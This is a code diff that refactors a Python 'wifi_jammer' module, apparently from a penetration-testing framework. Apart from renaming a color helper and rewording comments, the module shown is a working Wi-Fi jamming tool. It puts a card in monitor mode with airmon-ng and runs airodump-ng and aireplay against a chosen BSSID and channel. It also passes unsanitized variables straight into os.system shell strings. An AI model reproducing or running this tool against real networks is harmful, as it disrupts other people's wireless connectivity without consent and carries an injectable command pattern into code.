@@ -5,24 +5,24 @@ from collections import OrderedDict
 import subprocess
 import os
 from time import sleep
-from core import bcolors
+from core import colors
 from core import getpath
 
-#info about module
-#modules name (must be same as filename)
-modulename = "wifi_jammer"
-#module version
+# Info about the module
+# Module's name (should be same as file's name)
+name = "wifi_jammer"
+# Module version
 version = "1.0"
-#description
+# Description
 desc = "wifi jammer"
-#creator's github
+# Creator's github
 github = "4shadoww"
-#created by (creators name)
+# Creator's name
 createdby = "4shadoww"
-#email
+# Email
 email = "4shadoww0@gmail.com"
 
-#list of variables
+# List of the variables
 variables = OrderedDict((
 ('interface', 'wlan0'),
 ('bssid', 'none'),
@@ -39,16 +39,16 @@ vdesc = [
 'target channel number',
 ]
 
-#help for customcommands (remove if you will not use customcommands)
+# Help for the custom commands (remove if you will not use custom commands)
 mhelp = OrderedDict((
 ('scan', 'scan for target'),
 ('stop', 'terminate process'),
 ))
 
-#additional help notes
-help_notes = bcolors.WARNING+"this module will not work without root permission!\n this module will not work without xterm, aircrack-ng!"+bcolors.END
+# Additional help notes
+help_notes = colors.red+"this module will not work without root permission!\n this module will not work without xterm, aircrack-ng!"+colors.end
 
-#custom commands (remove this if you will not use custom commands)
+# Used with custom commands (remove this if are not using custom commands)
 customcommands = (
 'scan',
 'stop'
@@ -62,8 +62,8 @@ changelog = "Version 1.0:\n\trelease"
 
 
 def run():
-	print (bcolors.OKGREEN + "[*]Attack Has Been Started on : " + variables['essid'])
-	print ("use command 'stop' to end attack" + bcolors.END)
+	print (colors.green + "[*]Attack Has Been Started on : " + variables['essid'])
+	print ("use command 'stop' to end attack" + colors.end)
 	xterm_3 = "xterm -e "+ "airodump-ng" +" -c " + variables['channel'] + " --bssid " + variables['bssid'] + " " + variables['mon'] + " &"
 	os.system(xterm_3)
 	sleep(4)
@@ -72,14 +72,14 @@ def run():
 	sleep(1)
 	os.system(xterm_4)
 	sleep(3)
-	print(bcolors.OKGREEN+"attack started"+bcolors.END)
+	print(colors.green+"attack started"+colors.end)
 
 def stop():
 	subprocess.Popen("killall xterm", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 	subprocess.Popen("killall aireplay", stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
 	xterm_5 =  "airmon-ng"+" stop " + variables['interface']
 	os.system(xterm_5)
-	print(bcolors.OKGREEN+"process terminated..."+bcolors.END)
+	print(colors.green+"process terminated..."+colors.end)
 
 def scan():
 	xterm_1 = "airmon-ng"+" start " + variables['interface']
@@ -88,4 +88,4 @@ def scan():
 	sleep(3)
 	os.system(xterm_2)
 	sleep(4)
-	print(bcolors.OKGREEN+"scan started"+bcolors.END)
+	print(colors.green+"scan started"+colors.end)
